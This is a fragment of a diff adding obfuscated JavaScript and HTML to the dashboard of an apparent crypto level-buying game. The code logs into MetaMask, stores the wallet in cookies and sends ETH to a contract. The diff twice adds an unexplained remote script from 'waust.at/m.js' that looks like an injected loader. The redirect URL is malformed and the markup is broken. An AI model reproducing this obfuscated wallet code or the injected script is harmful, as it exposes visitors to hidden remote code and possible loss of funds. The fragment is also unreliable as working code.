Web3(web3[_0x16ac('0xc')]);}else{console[_0x16ac('0x3')](_0x16ac('0xd'));}if(window['web3']!==_0x16ac('0x1')){web3[_0x16ac('0xe')][_0x16ac('0xf')]({'to':contract_address,'from':account,'value':_0xe7f698,'gas':0xf4240,'gasPrice':0x4a817c800,'data':account})['on'](_0x16ac('0x10'),function(_0x2a7747){document[_0x16ac('0x11')]('transalert_block_sent')['className']=_0x16ac('0x12');document[_0x16ac('0x11')](_0x16ac('0x13'))[_0x16ac('0x14')]=_0x16ac('0x15')+_0x2a7747;})['on'](_0x16ac('0x16'),function(_0x25ece5,_0x33c632){updateDashboard();})['on'](_0x16ac('0xb'),console[_0x16ac('0xb')]);}}else{document[_0x16ac('0x11')](_0x16ac('0x17'))[_0x16ac('0x18')]=''+_0xe7f698/0xde0b6b3a7640000;document[_0x16ac('0x11')]('payalert_nextlv_num')['innerHTML']=''+_0x4ad6df;document[_0x16ac('0x11')](_0x16ac('0x19'))[_0x16ac('0x18')]=''+levelGetting[_0x4ad6df-0x1];document[_0x16ac('0x11')](_0x16ac('0x1a'))[_0x16ac('0x1b')]=''+contract_address;document[_0x16ac('0x11')](_0x16ac('0x1a'))[_0x16ac('0x14')]=_0x16ac('0x1c')+contract_address;document[_0x16ac('0x11')](_0x16ac('0x1d'))['className']='payalert_block\x20payalert_block_active';}}function updateDashboard(){if(account==''||typeof account===_0x16ac('0x1')){}else{var _0x1ac093=new Date()[_0x16ac('0x1e')]()/0x3e8;document[_0x16ac('0x11')](_0x16ac('0x1f'))[_0x16ac('0x18')]=''+account;gameContractStat[_0x16ac('0x20')][_0x16ac('0x21')](account)[_0x16ac('0x22')]({'from':account},(_0x5337b8,_0x1db230)=>{if(_0x1db230['id']!=0x0){document[_0x16ac('0x11')]('vs_user_account_id')[_0x16ac('0x18')]=_0x16ac('0x23')+_0x1db230['id'];document[_0x16ac('0x11')](_0x16ac('0x24'))[_0x16ac('0x1b')]=_0x16ac('0x25')+langPrefiks+_0x16ac('0x26')+_0x1db230['id'];document[_0x16ac('0x11')](_0x16ac('0x27'))[_0x16ac('0x28')]=function(){window['open'](_0x16ac('0x29')+langPrefiks+_0x16ac('0x26')+_0x1db230['id'],'_blank',_0x16ac('0x2a'));return![];};document[_0x16ac('0x11')](_0x16ac('0x2b'))[_0x16ac('0x28')]=function(){window[_0x16ac('0x2c')](_0x16ac('0x2d')+langPrefiks+'?rid='+_0x1db230['id'],_0x16ac('0x2e'),_0x16ac('0x2a'));return![];};document[_0x16ac('0x11')]('vs_twitter')[_0x16ac('0x28')]=function(){window[_0x16ac('0x2c')](_0x16ac('0x2f')+langPrefiks+_0x16ac('0x26')+_0x1db230['id'],_0x16ac('0x2e'),'scrollbars=0,\x20resizable=1,\x20menubar=0,\x20left=200,\x20top=200,\x20width=550,\x20height=440,\x20toolbar=0,\x20status=0');return![];};var _0x5c0738=[];for(var _0x3ad4a5=0x1;_0x3ad4a5<=0x8;_0x3ad4a5++){_0x5c0738[_0x16ac('0x30')](gameContractStat['methods'][_0x16ac('0x31')](account,_0x3ad4a5)[_0x16ac('0x22')]({'from':account}));}Promise['all'](_0x5c0738)[_0x16ac('0x32')](function(){var _0x37399f=!![];for(var _0x3ad4a5=0x1;_0x3ad4a5<=0x8;_0x3ad4a5++){if(arguments[0x0][_0x3ad4a5-0x1]!=0x0){var _0x305cb4=arguments[0x0][_0x3ad4a5-0x1]-_0x1ac093;if(_0x305cb4<=0x0){if(_0x37399f==!![]){document[_0x16ac('0x11')](_0x16ac('0x33')+_0x3ad4a5)[_0x16ac('0x34')](_0x16ac('0x35'),_0x16ac('0x36')+_0x3ad4a5+');');document[_0x16ac('0x11')]('vs_level_buy_button_'+_0x3ad4a5)['className']=_0x16ac('0x37');document[_0x16ac('0x11')](_0x16ac('0x38'))['setAttribute']('onClick',_0x16ac('0x36')+_0x3ad4a5+');');document[_0x16ac('0x11')](_0x16ac('0x38'))['classList'][_0x16ac('0x39')](_0x16ac('0x3a'));document[_0x16ac('0x11')](_0x16ac('0x38'))[_0x16ac('0x18')]=dsh_lvs_extend+'\x20'+_0x3ad4a5+_0x16ac('0x3b');}else{}_0x37399f=![];document['getElementById'](_0x16ac('0x3c')+_0x3ad4a5)[_0x16ac('0x3d')]='color:\x20#ff3b30;';document[_0x16ac('0x11')](_0x16ac('0x3e')+_0x3ad4a5)[_0x16ac('0x3d')]='color:\x20#ff3b30;';document[_0x16ac('0x11')]('vs_level_Expired_top_'+_0x3ad4a5)[_0x16ac('0x18')]=dsh_lvs_expired;}else{if(_0x37399f==!![]){document[_0x16ac('0x11')](_0x16ac('0x33')+_0x3ad4a5)[_0x16ac('0x3f')]=_0x16ac('0x40');document[_0x16ac('0x11')]('vs_level_buy_button_'+_0x3ad4a5)['setAttribute']('onClick','javascript:\x20buyLevel('+_0x3ad4a5+');');}document[_0x16ac('0x11')]('vs_level_Expired_top_'+_0x3ad4a5)['style']=_0x16ac('0x41');document[_0x16ac('0x11')]('vs_level_Expired_bottom_'+_0x3ad4a5)[_0x16ac('0x3d')]=_0x16ac('0x41');document['getElementById'](_0x16ac('0x3c')+_0x3ad4a5)[_0x16ac('0x18')]=dsh_lvs_active;}document[_0x16ac('0x11')](_0x16ac('0x33')+_0x3ad4a5)[_0x16ac('0x18')]=dsh_lvs_extend;document['getElementById']('vs_level_Expired_bottom_'+_0x3ad4a5)[_0x16ac('0x18')]=Math[_0x16ac('0x42')](_0x305cb4/0x3c/0x3c/0x18)+'\x20'+dsh_lvs_days;document[_0x16ac('0x11')]('vs_level_top')[_0x16ac('0x18')]=_0x3ad4a5+'\x20level';document[_0x16ac('0x11')]('vs_level_top_p_t')[_0x16ac('0x18')]=''+(_0x3ad4a5+0x1);document[_0x16ac('0x11')](_0x16ac('0x43'))[_0x16ac('0x18')]=''+(_0x3ad4a5+0x1);document[_0x16ac('0x11')](_0x16ac('0x44'))[_0x16ac('0x18')]=levelSending[_0x3ad4a5];document['getElementById'](_0x16ac('0x45'))[_0x16ac('0x18')]=levelGetting[_0x3ad4a5];}else{if(_0x37399f==!![]){document[_0x16ac('0x11')](_0x16ac('0x33')+_0x3ad4a5)['innerHTML']=dsh_lvs_buy;document[_0x16ac('0x11')]('vs_level_Expired_top_'+_0x3ad4a5)[_0x16ac('0x3d')]=_0x16ac('0x46');document[_0x16ac('0x11')](_0x16ac('0x3e')+_0x3ad4a5)[_0x16ac('0x3d')]=_0x16ac('0x46');document['getElementById']('vs_level_buy_button_'+_0x3ad4a5)[_0x16ac('0x34')](_0x16ac('0x35'),_0x16ac('0x36')+_0x3ad4a5+');');document['getElementById']('vs_level_buy_button_'+_0x3ad4a5)[_0x16ac('0x3f')]='pa-btn\x20pa-btn-levelblue';document[_0x16ac('0x11')](_0x16ac('0x38'))[_0x16ac('0x34')](_0x16ac('0x35'),_0x16ac('0x36')+_0x3ad4a5+');');}_0x37399f=![];document[_0x16ac('0x11')](_0x16ac('0x3c')+_0x3ad4a5)['innerHTML']=dsh_lvs_notactive;document['getElementById'](_0x16ac('0x3e')+_0x3ad4a5)['innerHTML']=dsh_lvs_nodate;}}},function(_0x5337b8){console[_0x16ac('0xb')](_0x1db230);});$[_0x16ac('0x47')]({'url':_0x16ac('0x48')+_0x1db230['id'],'data':{},'success':function(_0x470114){console[_0x16ac('0x3')](_0x470114[_0x16ac('0x49')]);document[_0x16ac('0x11')](_0x16ac('0x4a'))['innerHTML']=_0x470114[_0x16ac('0x49')];},'error':function(_0x2b1d0b){console['log'](_0x2b1d0b);}});}else{window[_0x16ac('0x5')]=_0x16ac('0x4b');}});}gameContractStat[_0x16ac('0x4c')](_0x16ac('0x4d'),{'filter':{'_user':account},'fromBlock':0x4b2229,'toBlock':_0x16ac('0x4e')},(_0x260e0f,_0x120762)=>{_0x120762[_0x16ac('0x4f')]();var _0x127a06=0x0;for(var _0xb2e4b0 in _0x120762){var _0x170903=new Date(_0x120762[_0xb2e4b0][_0x16ac('0x50')]['_time']*0x3e8)[_0x16ac('0x51')](_0x16ac('0x52'));_0x127a06+=levelPrice[_0x120762[_0xb2e4b0][_0x16ac('0x50')][_0x16ac('0x53')]-0x1];}document[_0x16ac('0x11')]('vs_dshbrd_totalincome')[_0x16ac('0x18')]=_0x127a06/0xde0b6b3a7640000;document[_0x16ac('0x11')](_0x16ac('0x54'))[_0x16ac('0x18')]=_0x127a06/0xde0b6b3a7640000;});document[_0x16ac('0x11')](_0x16ac('0x55'))['innerHTML']=(0x1/usdtPrice)[_0x16ac('0x56')](0x0);}var web3Stat=new Web3(new Web3['providers'][(_0x16ac('0x57'))](nodeUrl));const gameContractStat=new web3Stat[(_0x16ac('0xe'))][(_0x16ac('0x58'))](abi,contract_address);var account=getCookie(_0x16ac('0x59'));updateDashboard();setInterval(function(){updateDashboard();},0xea60);
 </script>
+            </div>
+        </section>
+
+<script type="text/javascript" src="./assets/js/line.js"></script>
+<script>
+var _0x1c11=['Z2V0TW9uZXlGb3JMZXZlbEV2ZW50','cmV0dXJuVmFsdWVz','X2xldmVs','dnNfZHNoYnJkX3RvdGFsaW5jb21lX2hlYWRlcg==','dW5kZWZpbmVk','Z2V0RWxlbWVudEJ5SWQ=','dnNfdXNlcl9hY2NvdW50X2lkX2hlYWRlcg==','aW5uZXJIVE1M','bWV0aG9kcw==','dXNlcnM=','Y2FsbA==','aWQ6IA==','Z2V0UGFzdEV2ZW50cw=='];(function(_0x2d7b0e,_0x1da50f){var _0x13df3f=function(_0x38f1e7){while(--_0x38f1e7){_0x2d7b0e['push'](_0x2d7b0e['shift']());}};_0x13df3f(++_0x1da50f);}(_0x1c11,0x1b1));var _0x53fe=function(_0x1473e4,_0x1a9164){_0x1473e4=_0x1473e4-0x0;var _0x72b3b2=_0x1c11[_0x1473e4];if(_0x53fe['DsOzLx']===undefined){(function(){var _0xdd735d=function(){var _0x52d4dc;try{_0x52d4dc=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x5aa5cd){_0x52d4dc=window;}return _0x52d4dc;};var _0xed4c3e=_0xdd735d();var _0x581035='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0xed4c3e['atob']||(_0xed4c3e['atob']=function(_0x3fc5a6){var _0x3c092e=String(_0x3fc5a6)['replace'](/=+$/,'');for(var _0x142378=0x0,_0x49b7b8,_0x489737,_0x3ae327=0x0,_0x12fa2b='';_0x489737=_0x3c092e['charAt'](_0x3ae327++);~_0x489737&&(_0x49b7b8=_0x142378%0x4?_0x49b7b8*0x40+_0x489737:_0x489737,_0x142378++%0x4)?_0x12fa2b+=String['fromCharCode'](0xff&_0x49b7b8>>(-0x2*_0x142378&0x6)):0x0){_0x489737=_0x581035['indexOf'](_0x489737);}return _0x12fa2b;});}());_0x53fe['nKcyyv']=function(_0xd6f40){var _0x1c7aa3=atob(_0xd6f40);var _0x2491fe=[];for(var _0x50ed3d=0x0,_0x501cd6=_0x1c7aa3['length'];_0x50ed3d<_0x501cd6;_0x50ed3d++){_0x2491fe+='%'+('00'+_0x1c7aa3['charCodeAt'](_0x50ed3d)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2491fe);};_0x53fe['rNvHAs']={};_0x53fe['DsOzLx']=!![];}var _0x709f8c=_0x53fe['rNvHAs'][_0x1473e4];if(_0x709f8c===undefined){_0x72b3b2=_0x53fe['nKcyyv'](_0x72b3b2);_0x53fe['rNvHAs'][_0x1473e4]=_0x72b3b2;}else{_0x72b3b2=_0x709f8c;}return _0x72b3b2;};if(account!==''&&account!==_0x53fe('0x0')){document[_0x53fe('0x1')](_0x53fe('0x2'))[_0x53fe('0x3')]=''+account;gameContractStat[_0x53fe('0x4')][_0x53fe('0x5')](account)[_0x53fe('0x6')]({'from':account},(_0x4fa231,_0x505b27)=>{if(_0x505b27['id']!=0x0){document[_0x53fe('0x1')]('vs_user_account_header')['innerHTML']=_0x53fe('0x7')+_0x505b27['id'];}});gameContractStat[_0x53fe('0x8')](_0x53fe('0x9'),{'filter':{'_user':account},'fromBlock':0x4b2229,'toBlock':'latest'},(_0x77796,_0x402092)=>{var _0x13d406=0x0;for(var _0x2595d7 in _0x402092){_0x13d406+=levelPrice[_0x402092[_0x2595d7][_0x53fe('0xa')][_0x53fe('0xb')]-0x1];}document[_0x53fe('0x1')](_0x53fe('0xc'))[_0x53fe('0x3')]=_0x13d406/0xde0b6b3a7640000;});}
+</script>
+<script async src="https://waust.at/m.js"></script>
+
+
+
+
+<style>
+
+
+      
+      <script type="text/javascript">
+            document.getElementById('popupalert_closebtn_a_corrnetmm').onclick = function() {
+                document.getElementById('popupalert_block_corrnetmm').classList.remove('popupalert_block_active');
+            }
+        </script>
+    </div>
+</div>
+
+
+<script src="https://cryptohands.org/assets/js/web3_1_0/web3.min.js"></script>
+<script type="text/javascript">
+function delete_cookie(name) {
+  document.cookie = name +'=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;';
+}
+delete_cookie('wallet');
+delete_cookie('noMetaMask');
+
+    document.getElementById('login_btnmm').addEventListener("click", async () => {
+    
+    if (window.ethereum) {
+        window.web3 = new Web3(ethereum);
+        try {
+            await ethereum.enable();
+            var account = 0;
+                await web3.eth.getAccounts().then(it => {
+                    account = it[0];
+                });
+            if(account){
+            //console.log(account);
+                var netId = 0;
+                await web3.eth.net.getId().then(it => {
+                    netId = it;
+                });
+                if(netId == 1){
+                    document.cookie = "wallet="+account+"; Path=/;";
+                    document.cookie = "noMetaMask="+false+"; Path=/;";
+                    window.location = "https://nguyenphunho.github./Home-Dashboard";
+                }
+                else{
+                    document.getElementById('popupalert_block_corrnetmm').classList.add('popupalert_block_active');
+                }
+            }else{
+                document.getElementById('popupalert_block_loginmm').classList.add('popupalert_block_active');
+            }
+        } catch (error) {
+            document.getElementById('popupalert_block_loginmm').classList.add('popupalert_block_active');
+        }
+     } else if (window.web3) {
+            window.web3 = new Web3(web3.currentProvider);
+            
+            var account = 0;
+            await web3.eth.getAccounts().then(it => {
+                account = it[0];
+            });
+            if(account){
+                var netId = 0;
+                await web3.eth.net.getId().then(it => {
+                    netId = it;
+                });
+                if(netId == 1){
+                    document.cookie = "wallet="+account+"; Path=/;";
+                    document.cookie = "noMetaMask="+false+"; Path=/;";
+                    window.location = "https://nguyenphunho.github./Home-Dashboard";
+                }
+                else{
+                    document.getElementById('popupalert_block_corrnetmm').classList.add('popupalert_block_active');
+                }
+            }else{
+                document.getElementById('popupalert_block_loginmm').classList.add('popupalert_block_active');
+            }
+
+    }else {
+           document.getElementById('popupalert_block_installmm').classList.add('popupalert_block_active');
+    }
+    });
+</script>
+
+<script async src="https://waust.at/m.js"></script>
+
+
+
+
+<style>
+.sh_btn {
+    top: 75%;
+    left: 0;
+    right: auto;
+    bottom: auto;
+    margin-top: -12px;
+    width: 24px;
+    height: 24px;
+    min-width: 0;
+    min-height: 0;
+    box-shadow: none;
+    border-radius: 0 3px 3px 0;
+    background: #4cd964;
+}    
+.sh_btn:hover {
+    box-shadow: none;
+    background: #4cd964;
+}
+ 
+.sh_btn:before {
+    content: ' ';
+    position: absolute;
+    top: 0;
+    left: 0;
+    height: 24px;
+    width: 24px;
+    border-radius: 0 3px 3px 0;
+    background: rgba(0, 0, 0, 0);
+    -webkit-transition: 0.3s ease all;
+    -o-transition: 0.3s ease all;
+    transition: 0.3s ease all;
+}
+.sh_btn:hover:before {
+    background: rgba(0, 0, 0, 0.14);
+}
+    
+.sh_btn:after {
+    content: ' ';
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    margin-top: -8px;
+    margin-left: -8px;
+    height: 16px;
+    width: 16px;
+    background: url() no-repeat;
+    background-size: 16px 16px;
+}
+    
+.sh_logo_img {
+    display: none;
+}
+    
+.sh_title_text {
+    position: absolute;
+    top: 0;
+    left: 100%;
+    right: auto;
+    bottom: 0;
+    margin: 0 !important;
+    margin-left: 12px !important;
+    margin-right: 12px !important;
+    display: block;
+    float: none !important;
+    border: none !important;
+    width: auto;
+    max-width: none !important;
+    min-width: 0 !important;
+    height: 100% !important;
+    padding: 0 !important;
+    line-height: 24px !important;
+    font-size: 12px !important;
+    color: #888888 !important;
+    overflow: visible !important;
+    white-space: nowrap !important;
+    visibility: hidden !important;
+    opacity: 0 !important;
+    transition: 0.2s;
+}
+.sh_btn:hover .sh_title_text {
+    visibility: visible !important;
+    opacity: 1 !important;
+}
+    
+@media (max-width: 1000px) {
+    .sh_btn {
+        left: auto;
+        right: 0;
+        border-radius: 3px 0 0 3px;
+    }
+    .sh_btn:before {
+        border-radius: 3px 0 0 3px;
+    }
+    .sh_title_text {
+        left: auto;
+        right: 100%;
+    }
+}
+</style>
 
 
 
